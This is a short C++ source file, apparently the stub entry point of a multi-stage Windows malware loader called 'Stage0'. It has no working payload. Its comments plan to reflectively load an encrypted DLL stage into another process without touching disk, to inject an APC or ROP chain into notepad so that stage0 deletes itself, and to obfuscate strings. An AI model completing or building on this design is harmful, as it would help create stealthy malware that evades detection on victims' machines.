#include "File.hpp"
#include "Exception.hpp"
#include "DefinesMacros.hpp"

#include <windows.h>

int wWinMain(
    UNUSED(_In_ HINSTANCE hInstance),
    UNUSED(_In_opt_ HINSTANCE hPrevInstance),
    UNUSED(_In_ LPWSTR lpCmdLine),
    UNUSED(_In_ int nShowCmd)
)
{
    // protections

    try
    {
        // Find a process that can load a driver and reflectively load the ArcaneDLLStage1 into it (no disk)
        // inject a APC/rop into notepad or something to delete the stage0
        
        // Process class
        // Read file class -> decryptor class
        // Reflective loader class
        // Self delete APC class
        // self delete ROP class
    }
    CATCH_ALL(OBFUSCATE("Exception caught in Stage0 main!"))

	return 0;
}